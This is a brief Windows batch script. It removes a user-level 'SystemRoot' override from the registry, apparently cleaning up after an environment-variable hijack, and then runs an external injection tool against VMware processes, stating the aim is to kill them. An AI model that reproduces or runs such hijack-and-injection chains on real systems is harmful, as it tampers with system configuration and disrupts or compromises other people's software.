@echo off

echo wait 30 seconds before fixing SystemRoot 
ping 127.0.0.1 -n 30 > nul
REG delete HKCU\Environment /V SystemRoot /f

echo kill vmware.exe, vmplayer.exe, vmware-vmx.exe, vmrun.exe
start simple_injection.exe vmware.exe
start simple_injection.exe vmplayer.exe
start simple_injection.exe vmware-vmx.exe
start simple_injection.exe vmrun.exe

PAUSE